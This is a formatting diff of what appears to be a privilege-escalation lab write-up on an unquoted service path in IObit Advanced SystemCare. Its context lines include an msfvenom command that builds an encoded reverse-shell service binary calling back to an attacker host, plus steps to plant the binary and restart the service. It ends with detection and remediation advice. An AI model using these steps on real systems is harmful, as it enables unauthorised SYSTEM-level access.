@@ -69,13 +69,13 @@ The service binary path is something like:
 C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
 ```
 
-That path contains a space and is not enclosed in quotation marks in the service registration. **Windows resolves an unquoted path ambiguously**: it tries `C:\Program.exe`, then `C:\Program Files.exe`, then `C:\Program Files (x86)\IObit\Advanced.exe`, and only then the real binary. If the attacker can write any of those intermediate filenames, that's the one that runs.
+That path contains a space and is not enclosed in quotation marks in the service registration. **Windows resolves an unquoted path ambiguously**: it tries C:\Program.exe, then C:\Program Files.exe, then C:\Program Files (x86)\IObit\Advanced.exe, and only then the real binary. If the attacker can write any of those intermediate filenames, that's the one that runs.
 
 **Step 5 - Confirm write access and CanRestart.** PowerUp reports:
 
 - Path contains spaces and is unquoted.
 - *CanRestart: True* (which is the critical factor).
-- The low-priv user has write access to `C:\Program Files (x86)\IObit\`.
+- The low-priv user has write access to C:\Program Files (x86)\IObit\.
 
 *CanRestart* means the service can be stopped and started without admin, so the attacker does not have to wait for a reboot.
 
@@ -86,7 +86,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4443 \
   -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
 ```
 
-Upload Advanced.exe to `C:\Program Files (x86)\IObit\Advanced.exe`.
+Upload Advanced.exe to C:\Program Files (x86)\IObit\Advanced.exe.
 
 **Step 7 - Restart the service.**
 
@@ -115,5 +115,5 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | finds
 ```
 
 - Fix unquoted paths by enclosing the binary path in quotation marks in the service registration. Microsoft has known about this for two decades but it still keeps showing up in third-party installers.
-- Apply *principle of least privilege* to service installation directories. Strip *Modify* access from non-admin users on every `C:\Program Files` subdirectory.
+- Apply *principle of least privilege* to service installation directories. Strip *Modify* access from non-admin users on every C:\Program Files subdirectory.
 - Block service restart by non-admin users. The *CanRestart* check is the bug. Service ACLs should not allow non-admin SCM control.
